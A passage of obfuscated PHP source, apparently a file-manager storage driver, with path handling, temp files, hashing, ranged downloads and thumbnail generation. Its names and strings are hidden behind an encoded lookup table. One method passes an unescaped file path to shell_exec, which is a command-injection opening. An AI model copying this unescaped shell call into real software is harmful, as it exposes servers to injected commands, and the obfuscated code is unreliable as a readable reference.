$À™ˆÒàÆ[8]; $ëÛ¹ƒ¾ = strpos($áµµØ‡à, $Ã÷Ç§‡’) === 0; return $ëÛ¹ƒ¾; } public function getType() { $üî’ÀÕ­ =& $_SERVER[Æ š¦İÈ]; $ÔíÜ¸Ÿ‘ = str_replace($üî’ÀÕ­[74], $üî’ÀÕ­[12], get_class($this)); return strtolower($ÔíÜ¸Ÿ‘); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($È±±õâå, $ Ö¾İ½¿) { $õæ÷Á¾Ï =& $_SERVER[Æ š¦İÈ]; $ÒÁ÷‘â = rtrim($È±±õâå, $õæ÷Á¾Ï[8]) . $õæ÷Á¾Ï[8] . $ Ö¾İ½¿; $ï¸†¾Šë = $this->exist($ÒÁ÷‘â); return $ï¸†¾Šë ? $ÒÁ÷‘â : !1; } public function setModifyTime($ÍÌõ‚ªÅ, $Øô£…Ğ = '') { } public function renameObject($È½ôòı–, $€Ê¿³œ) { $ˆÑä¯¯ =& $_SERVER[Æ š¦İÈ]; $Îß´•¼À = $€Ê¿³œ; Hook::trigger($ˆÑä¯¯[75], $this, $È½ôòı–, $this, $this->pathFather($È½ôòı–) . $€Ê¿³œ); $È½ôòı– = $this->getPathOuter($È½ôòı–); $€Ê¿³œ = $this->pathFather($È½ôòı–) . $€Ê¿³œ; if (IO::isFile($È½ôòı–)) { $ü¼ŞÜ¸ô = IO::copy($È½ôòı–, $this->pathFather($È½ôòı–), REPEAT_RENAME_FOLDER, $Îß´•¼À); if ($ü¼ŞÜ¸ô) { IO::remove($È½ôòı–); } } else { $ü¼ŞÜ¸ô = IO::mkdir($€Ê¿³œ); if (!$ü¼ŞÜ¸ô) { return !1; } $’íûê¶í = IO::listPath($È½ôòı–, !0); $öœŒÉÔ‡ = array_merge($’íûê¶í[$ˆÑä¯¯[76]], $’íûê¶í[$ˆÑä¯¯[77]]); foreach ($öœŒÉÔ‡ as $‹¡¾ú‘Ü) { IO::move($‹¡¾ú‘Ü[$ˆÑä¯¯[78]], $€Ê¿³œ, REPEAT_RENAME_FOLDER); } IO::remove($È½ôòı–); } return $ü¼ŞÜ¸ô ? $€Ê¿³œ : !1; } public function tempFile($ÆÂ‹Êüş = '', $‡Åç»¾ = '') { if (!$ÆÂ‹Êüş) { $ÆÂ‹Êüş = rand_string(15); } $±œ“ÎÖ = TEMP_FILES . rand_string(15) . $_SERVER[Æ š¦İÈ][8]; @mkdir($±œ“ÎÖ, DEFAULT_PERRMISSIONS, !0); $Óû¾øÁë = $±œ“ÎÖ . $ÆÂ‹Êüş; @touch($Óû¾øÁë); if ($‡Åç»¾) { file_put_contents($Óû¾øÁë, $‡Åç»¾); } return $Óû¾øÁë; } public function tempFileRemve($›Â¿ı) { @unlink($›Â¿ı); @rmdir($this->pathFather($›Â¿ı)); } public function mkfile($¡øÎÚŸ©, $ä°æ…ë = '', $£±õìö¯ = REPEAT_RENAME) { } public function mkdir($•¹óÂ²€, $Îê˜œşà = REPEAT_SKIP) { } public function delFile($‰Ò´‚²) { } public function delFolder($Û”çë€) { } public function copyFile($„ı†õ±Ğ, $Êë¼…¶è) { } public function moveFile($ìÂìŒ¾£, $Ñ„½Ğ‘›) { } public function remove($ Ûæ·áû) { if ($this->isFile($ Ûæ·áû)) { return $this->delFile($ Ûæ·áû); } return $this->delFolder($ Ûæ·áû); } public function rename($±İÍêÀ¤, $ïÀÁè»©) { } public function exist($×·ÃªÄí) { } public function findByHash($®ì¢†š¡ = '', $­àÖŸÚ… = '') { return !1; } public function isFile($‹õÕ”­Ş) { } public function isFolder($üöÕà½È) { } public function size($ÔËÙÔ“„) { } public function info($•ßÌ¤) { } public function infoSimple($æà¬ŞôÅ) { return $this->info($æà¬ŞôÅ); } public function infoAuth($«å¤ƒâı) { return $this->info($«å¤ƒâı); } public function infoFull($¢Ûâäçš) { return $this->info($¢Ûâäçš); } public function infoWithChildren($äÂÓ‰å) { $Æ™‹—‘Ä =& $_SERVER[Æ š¦İÈ]; static $ÈÑµ¤à• = array(); if (isset($ÈÑµ¤à•[$äÂÓ‰å])) { return $ÈÑµ¤à•[$äÂÓ‰å]; } $¿Òº£Œ² = $this->info($äÂÓ‰å); if ($¿Òº£Œ² && $¿Òº£Œ²[$Æ™‹—‘Ä[33]] == $Æ™‹—‘Ä[79]) { $Ï¿›ÀÃì = array($Æ™‹—‘Ä[80] => 0, $Æ™‹—‘Ä[81] => 0, $Æ™‹—‘Ä[82] => 0); $this->infoChildren($äÂÓ‰å, $Ï¿›ÀÃì); $¿Òº£Œ²[$Æ™‹—‘Ä[80]] = $Ï¿›ÀÃì[$Æ™‹—‘Ä[80]]; $¿Òº£Œ²[$Æ™‹—‘Ä[83]] = array($Æ™‹—‘Ä[84] => $Ï¿›ÀÃì[$Æ™‹—‘Ä[81]], $Æ™‹—‘Ä[85] => $Ï¿›ÀÃì[$Æ™‹—‘Ä[82]]); $ÈÑµ¤à•[$äÂÓ‰å] = $¿Òº£Œ²; } return $¿Òº£Œ²; } public function listPath($Şô‚Õß, $¯¶Õ×÷¸ = false) { } public function has($‘÷’¤‡, $Êïã×ªä = false, $šœÛ¸‰Û = false) { } public function canRead($¯§Ú½œ“) { } public function canWrite($é¢Õóş) { } public function getContent($Û±Ç¤È) { } public function setContent($ô—ƒÍ¼ä, $ùÄüœ ë = '') { } protected function infoChildren($°Éö¹ÃÍ, &$Úß³¼ßó) { $‚¬Õö¼ =& $_SERVER[Æ š¦İÈ]; check_abort_echo(); $úŒÚ®şÀ = $this->listPath($°Éö¹ÃÍ, !0); $úŒÚ®şÀ = array_merge($úŒÚ®şÀ[$‚¬Õö¼[77]], $úŒÚ®şÀ[$‚¬Õö¼[76]]); foreach ($úŒÚ®şÀ as $¦ï¿Êåß) { if ($¦ï¿Êåß[$‚¬Õö¼[33]] == $‚¬Õö¼[79]) { $Úß³¼ßó[$‚¬Õö¼[82]]++; $¢·Û¹Í¡ = $this->getPathInner($¦ï¿Êåß[$‚¬Õö¼[78]]); $this->infoChildren($¢·Û¹Í¡, $Úß³¼ßó); } else { $Úß³¼ßó[$‚¬Õö¼[81]]++; $Úß³¼ßó[$‚¬Õö¼[80]] += $¦ï¿Êåß[$‚¬Õö¼[80]]; } } } public function fileSubstr($´¡»å„, $ç©úıéé, $µ’ñæ•À) { } public function listAll($ø‘İâ‚¶) { } public function listAllMake($ €¬ç ·, &$ ñî´ÚÑ) { $ÏÑ´ò€ù =& $_SERVER[Æ š¦İÈ]; check_abort_echo(); $¹ÎÑ»Â´ = $this->listPath($ €¬ç ·, !0); if (!$¹ÎÑ»Â´) { return; } $´ªŒ…ˆ = array_merge($¹ÎÑ»Â´[$ÏÑ´ò€ù[77]], $¹ÎÑ»Â´[$ÏÑ´ò€ù[76]]); foreach ($´ªŒ…ˆ as $å°ƒ¾ë‘) { $·ÖÎºÅ = $å°ƒ¾ë‘[$ÏÑ´ò€ù[33]] == $ÏÑ´ò€ù[79]; $ôÌÃÏ¾­ = array($ÏÑ´ò€ù[78] => $å°ƒ¾ë‘[$ÏÑ´ò€ù[78]], $ÏÑ´ò€ù[79] => $·ÖÎºÅ); if (isset($å°ƒ¾ë‘[$ÏÑ´ò€ù[80]])) { $ôÌÃÏ¾­[$ÏÑ´ò€ù[80]] = $å°ƒ¾ë‘[$ÏÑ´ò€ù[80]]; } if (isset($å°ƒ¾ë‘[$ÏÑ´ò€ù[86]])) { $ôÌÃÏ¾­[$ÏÑ´ò€ù[86]] = $å°ƒ¾ë‘[$ÏÑ´ò€ù[86]]; } if (!$·ÖÎºÅ) { $ ñî´ÚÑ[] = $ôÌÃÏ¾­; continue; } $ ñî´ÚÑ[] = $ôÌÃÏ¾­; $×ƒÇßğ½ = $å°ƒ¾ë‘[$ÏÑ´ò€ù[78]]; $†éš¶§¦ = $this->pathDriver; if (substr($å°ƒ¾ë‘[$ÏÑ´ò€ù[78]], 0, strlen($†éš¶§¦)) == $†éš¶§¦) { $×ƒÇßğ½ = substr($×ƒÇßğ½, strlen($†éš¶§¦)); } $this->listAllMake($×ƒÇßğ½, $ ñî´ÚÑ); } } public function listAllSimple($Â®§¹¼Å) { $•„şĞÛ =& $_SERVER[Æ š¦İÈ]; $ „ñ³ŞÖ = array(); $ÇƒÖ’ = $this->listAll($Â®§¹¼Å); $àªâª±Ó = $this->getPathOuter($Â®§¹¼Å); foreach ($ÇƒÖ’ as $é›ôÇÚì) { $™ßÏ«ò˜ = $é›ôÇÚì[$•„şĞÛ[78]]; $á«­ÒÕœ = $é›ôÇÚì[$•„şĞÛ[78]]; if (isset($é›ôÇÚì[$•„şĞÛ[87]])) { $™ßÏ«ò˜ = $é›ôÇÚì[$•„şĞÛ[87]][$•„şĞÛ[78]]; $é›ôÇÚì[$•„şĞÛ[80]] = $é›ôÇÚì[$•„şĞÛ[87]][$•„şĞÛ[80]]; $é›ôÇÚì[$•„şĞÛ[86]] = $é›ôÇÚì[$•„şĞÛ[87]][$•„şĞÛ[86]]; } else { $á«­ÒÕœ = substr($é›ôÇÚì[$•„şĞÛ[78]], strlen(get_path_father($àªâª±Ó))); $á«­ÒÕœ = $•„şĞÛ[8] . ltrim($á«­ÒÕœ, $•„şĞÛ[8]); } $Í…Š‰¥Ñ = array($•„şĞÛ[78] => $á«­ÒÕœ, $•„şĞÛ[79] => $é›ôÇÚì[$•„şĞÛ[79]]); if (isset($é›ôÇÚì[$•„şĞÛ[80]]) && !$é›ôÇÚì[$•„şĞÛ[79]]) { $Í…Š‰¥Ñ[$•„şĞÛ[80]] = $é›ôÇÚì[$•„şĞÛ[80]]; } if (isset($é›ôÇÚì[$•„şĞÛ[86]])) { $Í…Š‰¥Ñ[$•„şĞÛ[86]] = $é›ôÇÚì[$•„şĞÛ[86]]; } if (!$é›ôÇÚì[$•„şĞÛ[79]]) { $Í…Š‰¥Ñ[$•„şĞÛ[88]] = $™ßÏ«ò˜; } $ „ñ³ŞÖ[] = $Í…Š‰¥Ñ; } return $ „ñ³ŞÖ; } public function upload($ÉıøÚø¹, $³ú°Ï¶›, $øãÅ¹µÖ = false, $–â‡ı˜ú = REPEAT_REPLACE) { } public function uploadFileByID($˜²¶¸ÇÒ, $úŠ‚øœº, $üãÂ‚ù) { } public function uploadFileByPath($ù§¿°’Ä, $ùö¦Ú, $õä²Ï£± = array()) { } public function isUploadServer() { $İÃÙ“¼ =& $_SERVER[Æ š¦İÈ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $İÃÙ“¼[89]) { return !0; } return $GLOBALS[$İÃÙ“¼[6]][$İÃÙ“¼[90]][$İÃÙ“¼[91]]; } public function isFileOutServer() { $åïîü„Ï =& $_SERVER[Æ š¦İÈ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $åïîü„Ï[89]) { return !0; } return $GLOBALS[$åïîü„Ï[6]][$åïîü„Ï[90]][$åïîü„Ï[92]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Ğ§›¾®ù) { $ä© µâ =& $_SERVER[Æ š¦İÈ]; if (!$this->isCdnHost()) { return $Ğ§›¾®ù; } return str_replace(trim(get_url_root($Ğ§›¾®ù), $ä© µâ[8]), trim($this->cdnHost, $ä© µâ[8]), $Ğ§›¾®ù); } public function uploadLink($Èõ‡Ù²å, $®¬üîÚº = 0) { $üÜ¯‡µĞ =& $_SERVER[Æ š¦İÈ]; if ($this->isUploadServer()) { return; } $†şâÃ‰ = $this->getType(); if (!in_array($†şâÃ‰, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‰õä‹ò = 1024 * 1024 * 10; $õÓ©ñôø = $®¬üîÚº <= $‰õä‹ò ? $üÜ¯‡µĞ[93] : $üÜ¯‡µĞ[94]; $£¿—¼‚— = (!$®¬üîÚº ? 1 : ceil($®¬üîÚº / pow(1024, 3))) * 3600 * 4; $™¡Ê²•Â = $this->{$õÓ©ñôø}($Èõ‡Ù²å, $£¿—¼‚—); if ($™¡Ê²•Â) { $™¡Ê²•Â[$üÜ¯‡µĞ[95]] = $Èõ‡Ù²å; $™¡Ê²•Â[$üÜ¯‡µĞ[96]] = $†şâÃ‰; } return $™¡Ê²•Â; } public function uploadFormData($Ëñƒ ãî, $‡Ê¾Š¼Ï = 3600) { } public function multiUploadFormData($Òºâàñ, $ğ¤ŒÍĞ = 3600) { } public function download($ø­ÈÍ, $Íã¡§¼Ì) { } public function ext($Éâ¥‚í›) { $Şì£Å¹ö =& $_SERVER[Æ š¦İÈ]; if (strpos($Éâ¥‚í›, $Şì£Å¹ö[8]) === -1) { $œæ³·Í° = $Éâ¥‚í›; } else { $œæ³·Í° = $this->pathThis($Éâ¥‚í›); } $“ÜÃÁÈù = $Şì£Å¹ö[12]; if (strstr($œæ³·Í°, $Şì£Å¹ö[10])) { $“ÜÃÁÈù = substr($œæ³·Í°, strrpos($œæ³·Í°, $Şì£Å¹ö[10]) + 1); $“ÜÃÁÈù = strtolower($“ÜÃÁÈù); } if (strlen($“ÜÃÁÈù) > 3 && preg_match($Şì£Å¹ö[97], $“ÜÃÁÈù, $Ó÷ñÌ‚Å)) { $“ÜÃÁÈù = $Şì£Å¹ö[12]; } return $“ÜÃÁÈù; } public function pathThis($Úì­‰ÄŒ) { $–òÁÒñ =& $_SERVER[Æ š¦İÈ]; $Úì­‰ÄŒ = str_replace($–òÁÒñ[98], $–òÁÒñ[8], rtrim($Úì­‰ÄŒ, $–òÁÒñ[8])); $Àí™Ÿ‰ó = strrpos($Úì­‰ÄŒ, $–òÁÒñ[8]); if ($Àí™Ÿ‰ó === !1) { return $Úì­‰ÄŒ; } return substr($Úì­‰ÄŒ, $Àí™Ÿ‰ó + 1); } public function pathFather($•—Ù²÷™) { $´ìÕÔË™ =& $_SERVER[Æ š¦İÈ]; $•—Ù²÷™ = str_replace($´ìÕÔË™[98], $´ìÕÔË™[8], rtrim($•—Ù²÷™, $´ìÕÔË™[8])); $ßÌˆœøğ = strrpos($•—Ù²÷™, $´ìÕÔË™[8]); if ($ßÌˆœøğ === !1) { return $´ìÕÔË™[12]; } return substr($•—Ù²÷™, 0, $ßÌˆœøğ + 1); } public function hashSimple($ëñ—˜”) { $íİÍîô =& $_SERVER[Æ š¦İÈ]; if (!$ëñ—˜”) { return md5($íİÍîô[12]); } $ÏÔ»êÁ­ = $this->size($ëñ—˜”); $¡Å¥¯Õ‰ = 200; $è–ü¯²¹ = 50; if ($ÏÔ»êÁ­ <= $¡Å¥¯Õ‰ * $è–ü¯²¹) { return $this->hashMd5($ëñ—˜”) . $ÏÔ»êÁ­; } $­°Íë˜» = intval($ÏÔ»êÁ­ / $è–ü¯²¹); $‹Ñ¿şÂ™ = $íİÍîô[12]; for ($¬ËìÜçø = 0; $¬ËìÜçø < $è–ü¯²¹; $¬ËìÜçø++) { $‹Ñ¿şÂ™ .= $this->fileSubstr($ëñ—˜”, $­°Íë˜» * $¬ËìÜçø, $¡Å¥¯Õ‰); } $‹Ñ¿şÂ™ .= $this->fileSubstr($ëñ—˜”, $ÏÔ»êÁ­ - $¡Å¥¯Õ‰, $¡Å¥¯Õ‰); return md5($‹Ñ¿şÂ™) . $ÏÔ»êÁ­; } public static $md5Cache = array(); public function hashMd5($ê…¯ÜŞİ) { if (!$ê…¯ÜŞİ) { return md5($_SERVER[Æ š¦İÈ][12]); } $ê…¯ÜŞİ = $this->iconvSystem($ê…¯ÜŞİ); if (isset(self::$md5Cache[$ê…¯ÜŞİ])) { return self::$md5Cache[$ê…¯ÜŞİ]; } self::$md5Cache[$ê…¯ÜŞİ] = $this->hashMd5Shell($ê…¯ÜŞİ); if (!self::$md5Cache[$ê…¯ÜŞİ]) { self::$md5Cache[$ê…¯ÜŞİ] = @md5_file($ê…¯ÜŞİ); } return self::$md5Cache[$ê…¯ÜŞİ]; } private function hashMd5Shell($¶ûãõÍ½) { $°¼¥‹õ“ =& $_SERVER[Æ š¦İÈ]; if (!$¶ûãõÍ½) { return md5($°¼¥‹õ“[12]); } if (!function_exists($°¼¥‹õ“[99])) { return !1; } $ßğ£àÂ™ = array($°¼¥‹õ“[100], $°¼¥‹õ“[101]); $­ì¯º¤× = Cache::get($°¼¥‹õ“[102]); if (!$­ì¯º¤×) { $âé—Ğ¡‹ = BASIC_PATH . $°¼¥‹õ“[103]; $·¦Òˆ¬ = md5_file($âé—Ğ¡‹); $­ì¯º¤× = $°¼¥‹õ“[104]; foreach ($ßğ£àÂ™ as $™ïÙ‰•ì) { $×Ëï´åÜ = shell_exec($™ïÙ‰•ì . "\x20\x22{$âé—Ğ¡‹}\42"); if ($×Ëï´åÜ && substr(trim($×Ëï´åÜ), 0, 32) == $·¦Òˆ¬) { $­ì¯º¤× = $™ïÙ‰•ì; break; } } Cache::set($°¼¥‹õ“[102], $­ì¯º¤×, 3600); } if ($­ì¯º¤× == $°¼¥‹õ“[104]) { return !1; } $×Ëï´åÜ = shell_exec($­ì¯º¤× . "\x20\x22{$¶ûãõÍ½}\42"); $×Ëï´åÜ = str_replace($°¼¥‹õ“[105], $°¼¥‹õ“[12], $×Ëï´åÜ); return substr($×Ëï´åÜ, 0, 32); } public function link($ë¶šÖ¶í) { return $ë¶šÖ¶í; } public function fileOut($”ğŒˆÁ, $±Ò¥ÂÑé = false, $™„’Îş¯ = false, $‰™‘Ä² = '') { $é„ƒ¾·ñ =& $_SERVER[Æ š¦İÈ]; $this->cacheMethod(null, null); if (!$”ğŒˆÁ || !$this->exist($”ğŒˆÁ)) { show_json(LNG($é„ƒ¾·ñ[106]), !1, $™„’Îş¯); } $¤ŒŞ„ = $this->getType() == $é„ƒ¾·ñ[107]; $Ö¡ŠĞ” = $GLOBALS[$é„ƒ¾·ñ[6]][$é„ƒ¾·ñ[90]][$é„ƒ¾·ñ[108]][$é„ƒ¾·ñ[109]]; $Ş’±ÙÆœ = (double) $GLOBALS[$é„ƒ¾·ñ[6]][$é„ƒ¾·ñ[90]][$é„ƒ¾·ñ[108]][$é„ƒ¾·ñ[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ö®şç˜± = $this->infoFull($”ğŒˆÁ); $ËÚåÏ³ç = $ö®şç˜±[$é„ƒ¾·ñ[80]]; $§Ë¢…ÖÑ = gmdate($é„ƒ¾·ñ[111], $ö®şç˜±[$é„ƒ¾·ñ[86]]); $ş¹İéÜ¤ = $™„’Îş¯ ? $™„’Îş¯ : $this->iconvApp($ö®şç˜±[$é„ƒ¾·ñ[32]]); $ÏîÏØ¯ = 0; $âÆÀåÌ´ = $ËÚåÏ³ç - 1; $¸«Ì‡î‘ = $this->ext($ş¹İéÜ¤); if (in_array($¸«Ì‡î‘, array($é„ƒ¾·ñ[112], $é„ƒ¾·ñ[113], $é„ƒ¾·ñ[114], $é„ƒ¾·ñ[115]))) { $¸«Ì‡î‘ = $é„ƒ¾·ñ[116]; } if (in_array($¸«Ì‡î‘, array($é„ƒ¾·ñ[117]))) { $¸«Ì‡î‘ = $é„ƒ¾·ñ[118]; } if (!$‰™‘Ä²) { $‰™‘Ä² = md5($§Ë¢…ÖÑ . $this->hashSimple($”ğŒˆÁ)); } $‰™‘Ä² = $é„ƒ¾·ñ[119] . $‰™‘Ä² . $é„ƒ¾·ñ[119]; $ğç½ÁåÂ = get_file_mime($¸«Ì‡î‘); if ($±Ò¥ÂÑé === !1 && !mime_support($ğç½ÁåÂ)) { $±Ò¥ÂÑé = !0; $ğç½ÁåÂ = $é„ƒ¾·ñ[120]; } header($é„ƒ¾·ñ[121]); header($é„ƒ¾·ñ[122] . $ğç½ÁåÂ); $ÉùÓ¿ò = rawurlencode($ş¹İéÜ¤); $ÉùÓ¿ò = $é„ƒ¾·ñ[119] . $ÉùÓ¿ò . $é„ƒ¾·ñ[123] . $ÉùÓ¿ò; if ($±Ò¥ÂÑé) { header($é„ƒ¾·ñ[124]); header($é„ƒ¾·ñ[125] . $ÉùÓ¿ò); } else { } header($é„ƒ¾·ñ[126] . gmdate($é„ƒ¾·ñ[111], time() + 3600 * 24 * 30) . $é„ƒ¾·ñ[127]); header($é„ƒ¾·ñ[128]); header($é„ƒ¾·ñ[129]); header($é„ƒ¾·ñ[130]); if (isset($_SERVER[$é„ƒ¾·ñ[131]]) && strtotime($_SERVER[$é„ƒ¾·ñ[131]]) == $ö®şç˜±[$é„ƒ¾·ñ[86]]) { header($é„ƒ¾·ñ[132], !0, 304); die; } if (isset($_SERVER[$é„ƒ¾·ñ[133]]) && $_SERVER[$é„ƒ¾·ñ[133]] == $‰™‘Ä²) { header($é„ƒ¾·ñ[134] . $‰™‘Ä², !0, 304); die; } header($é„ƒ¾·ñ[134] . $‰™‘Ä²); header($é„ƒ¾·ñ[135] . $§Ë¢…ÖÑ . $é„ƒ¾·ñ[127]); header($é„ƒ¾·ñ[136] . $ş¹İéÜ¤); header($é„ƒ¾·ñ[137]); header($é„ƒ¾·ñ[138] . $ËÚåÏ³ç); header($é„ƒ¾·ñ[139]); if (!$±Ò¥ÂÑé && $¸«Ì‡î‘ == $é„ƒ¾·ñ[140]) { if ($ËÚåÏ³ç > 1024 * 1024 * 5) { die; } $ÚÔˆ±ÇÍ = $this->getContent($”ğŒˆÁ); $ÚÔˆ±ÇÍ = Html::clearSVG($ÚÔˆ±ÇÍ); header($é„ƒ¾·ñ[141] . strlen($ÚÔˆ±ÇÍ)); echo $ÚÔˆ±ÇÍ; die; } $·ÙØá…ğ = strtolower($_SERVER[$é„ƒ¾·ñ[142]]); if ($¤ŒŞ„ && $·ÙØá…ğ && $Ö¡ŠĞ”) { if (strstr($·ÙØá…ğ, $é„ƒ¾·ñ[143])) { header($é„ƒ¾·ñ[144] . $”ğŒˆÁ); } else { if (strstr($·ÙØá…ğ, $é„ƒ¾·ñ[145])) { header($é„ƒ¾·ñ[146] . $”ğŒˆÁ); } else { if (strstr($·ÙØá…ğ, $é„ƒ¾·ñ[147])) { header($é„ƒ¾·ñ[148] . $”ğŒˆÁ); } } } if ($Ş’±ÙÆœ) { header($é„ƒ¾·ñ[149] . $Ş’±ÙÆœ); } return; } if (isset($_SERVER[$é„ƒ¾·ñ[150]])) { if (preg_match($é„ƒ¾·ñ[151], $_SERVER[$é„ƒ¾·ñ[150]], $ğ­éŞ›Ê)) { $ÏîÏØ¯ = intval($ğ­éŞ›Ê[1]); if (!empty($ğ­éŞ›Ê[2])) { $âÆÀåÌ´ = intval($ğ­éŞ›Ê[2]); } } header($é„ƒ¾·ñ[152]); header("\x43\157\156\164\x65\156\x74\55\x52\141\156\x67\x65\x3a\40\142\x79\x74\145\x73\x20{$ÏîÏØ¯}\x2d{$âÆÀåÌ´}\57" . $ËÚåÏ³ç); } else { header($é„ƒ¾·ñ[153]); } header($é„ƒ¾·ñ[154]); $áª±ÎÔ = !0; if ($_SERVER[$é„ƒ¾·ñ[155]] == $é„ƒ¾·ñ[156] && $ËÚåÏ³ç > 1204 * 1024 * 1024 * 2) { $áª±ÎÔ = !1; } if ($áª±ÎÔ) { header($é„ƒ¾·ñ[157] . ($âÆÀåÌ´ - $ÏîÏØ¯ + 1)); } if ($_SERVER[$é„ƒ¾·ñ[158]] == $é„ƒ¾·ñ[159]) { return; } $ãşá»©Ë = 1024 * 100; $ŞöáÍó³ = 0; if ($Ş’±ÙÆœ) { $ŞöáÍó³ = intval(1000 * 1000 * ($ãşá»©Ë / $Ş’±ÙÆœ)); } while ($ÏîÏØ¯ <= $âÆÀåÌ´) { $Ù¾Ñéóƒ = timeFloat(); check_abort(); $ì ¸¥·¢ = $âÆÀåÌ´ - $ÏîÏØ¯ + 1; if ($ì ¸¥·¢ <= $ãşá»©Ë) { $ãşá»©Ë = $ì ¸¥·¢; } echo $this->fileSubstr($”ğŒˆÁ, $ÏîÏØ¯, $ãşá»©Ë); $ÏîÏØ¯ += $ãşá»©Ë; if ($ãşá»©Ë == $ì ¸¥·¢) { $ÏîÏØ¯ = $âÆÀåÌ´ + 1; } if ($ŞöáÍó³) { $‡‚‹ù• = intval(1000 * 1000 * (timeFloat() - $Ù¾Ñéóƒ)); $ü»ºÈêè = $ŞöáÍó³ - $‡‚‹ù•; if ($ü»ºÈêè > 5) { usleep($ü»ºÈêè); } } } } public function fileOutServer($€¸û–ı, $½ù›¹Î = false, $‹®ÔªŸ½ = false, $Ûæ”€”­ = '') { $this->fileOut($€¸û–ı, $½ù›¹Î, $‹®ÔªŸ½, $Ûæ”€”­); } public function fileOutLink($çêÁÇî) { header($_SERVER[Æ š¦İÈ][160] . $çêÁÇî); die; } public function cacheMethod($ııˆÒø, $ñœ÷µá¯, $áœâ¸»ê = null) { $È‹ş€é =& $_SERVER[Æ š¦İÈ]; static $Ì´Â…› = array(); $ÀõŸŒâè = $ñœ÷µá¯ ? ltrim($this->getPathOuter($ñœ÷µá¯), $È‹ş€é[8]) : $ñœ÷µá¯; $œ¥¦òâŒ = $È‹ş€é[161] . $ııˆÒø . $È‹ş€é[162] . rtrim($ÀõŸŒâè, $È‹ş€é[8]); if (is_null($ııˆÒø)) { $Ì´Â…› = array(); return; } if (is_null($ñœ÷µá¯)) { unset($Ì´Â…›[$œ¥¦òâŒ]); return; } if (!is_null($áœâ¸»ê)) { $Ì´Â…›[$œ¥¦òâŒ] = $áœâ¸»ê; return; } $Ûä½²× = isset($Ì´Â…›[$œ¥¦òâŒ]) ? $Ì´Â…›[$œ¥¦òâŒ] : null; if (!is_null($Ûä½²×)) { return $Ûä½²×; } $Ûä½²× = $this->{$ııˆÒø}($ñœ÷µá¯); $Ì´Â…›[$œ¥¦òâŒ] = $Ûä½²×; return $Ûä½²×; } public function fileOutImage($æßß¥ç, $¶Æµ¤î¯ = 250) { $·è¶ÄÆ© =& $_SERVER[Æ š¦İÈ]; set_timeout(); if (substr($æßß¥ç, 0, 4) == $·è¶ÄÆ©[147]) { $this->fileOutLink($æßß¥ç); } $™”º‰‚Ÿ = $this->info($æßß¥ç); $ŠŒ‰¯ = $™”º‰‚Ÿ[$·è¶ÄÆ©[32]]; $Í“Æ‡§· = !1; if (isset($GLOBALS[$·è¶ÄÆ©[163]]) && $GLOBALS[$·è¶ÄÆ©[163]][$·è¶ÄÆ©[78]] == $™”º‰‚Ÿ[$·è¶ÄÆ©[78]]) { $õ®ºî“ = $GLOBALS[$·è¶ÄÆ©[163]][$·è¶ÄÆ©[164]]; if (!$™”º‰‚Ÿ[$·è¶ÄÆ©[165]]) { $™”º‰‚Ÿ[$·è¶ÄÆ©[165]] = $GLOBALS[$·è¶ÄÆ©[163]]; } if (isset($õ®ºî“[$·è¶ÄÆ©[166]])) { if ($õ®ºî“[$·è¶ÄÆ©[166]] <= $¶Æµ¤î¯ && $õ®ºî“[$·è¶ÄÆ©[167]] <= $¶Æµ¤î¯) { $Í“Æ‡§· = !0; } } $ŠŒ‰¯ = $™”º‰‚Ÿ[$·è¶ÄÆ©[165]][$·è¶ÄÆ©[32]]; } if ($™”º‰‚Ÿ[$·è¶ÄÆ©[80]] <= 1024 * 50 || $Í“Æ‡§· || !function_exists($·è¶ÄÆ©[168]) || $™”º‰‚Ÿ[$·è¶ÄÆ©[169]] == $·è¶ÄÆ©[170]) { return $this->fileOut($æßß¥ç, !1, $ŠŒ‰¯); } if (isset($™”º‰‚Ÿ[$·è¶ÄÆ©[165]][$·è¶ÄÆ©[171]])) { $ö¬ûå·€ = $™”º‰‚Ÿ[$·è¶ÄÆ©[165]][$·è¶ÄÆ©[171]]; } else { if (isset($™”º‰‚Ÿ[$·è¶ÄÆ©[165]][$·è¶ÄÆ©[172]])) { $ö¬ûå·€ = $™”º‰‚Ÿ[$·è¶ÄÆ©[165]][$·è¶ÄÆ©[172]]; } else { $ö¬ûå·€ = md5("{$™”º‰‚Ÿ[$·è¶ÄÆ©[32]]}\137{$™”º‰‚Ÿ[$·è¶ÄÆ©[78]]}\x5f{$™”º‰‚Ÿ[$·è¶ÄÆ©[80]]}"); } } $Å»»¡íÂ = "{$ö¬ûå·€}\x5f{$¶Æµ¤î¯}\56\x70\156\147"; if (!($íı…§İ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $·è¶ÄÆ©[173]))) { $ªï«ƒï– = IO::mkdir(IO_PATH_SYSTEM_TEMP . $·è¶ÄÆ©[174]); } else { $ªï«ƒï– = KodIO::make($íı…§İ); } if ($íı…§İ = IO::fileNameExist($ªï«ƒï–, $Å»»¡íÂ)) { $¹ñÕäÃ = KodIO::make($íı…§İ); return IO::fileOut($¹ñÕäÃ, !1, $ŠŒ‰¯); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $¹ñÕäÃ = DATA_THUMB . $Å»»¡íÂ; del_file($¹ñÕäÃ); if (!@file_exists($¹ñÕäÃ)) { $äÒ•’å = TEMP_FILES; if (!is_dir($äÒ•’å)) { mk_dir($äÒ•’å); } $°¯ŠÃÖª = $äÒ•’å . $ö¬ûå·€ . $·è¶ÄÆ©[10] . $™”º‰‚Ÿ[$·è¶ÄÆ©[169]]; if (!@file_exists($°¯ŠÃÖª)) { $°¯ŠÃÖª = $this->download($æßß¥ç, $°¯ŠÃÖª); } ImageThumb::createThumb($°¯ŠÃÖª, $¹ñÕäÃ, $¶Æµ¤î¯, $¶Æµ¤î¯ * 10); } if (!file_exists($¹ñÕäÃ) || filesize($¹ñÕäÃ) < 100) { return @file_exists($°¯ŠÃÖª) ? IO::fileOut($°¯ŠÃÖª) : $this->fileOut($æßß¥ç); } if (!($é¯÷š¤× = IO::move($¹ñÕäÃ, $ªï«ƒï–))) { return IO::fileOut($¹ñÕäÃ); } del_file($¹ñÕäÃ); IO::fileOut($é¯÷š¤×); } public function fileOutImageServer($Ù˜Î´‰, $ï‡˜ = 250) { 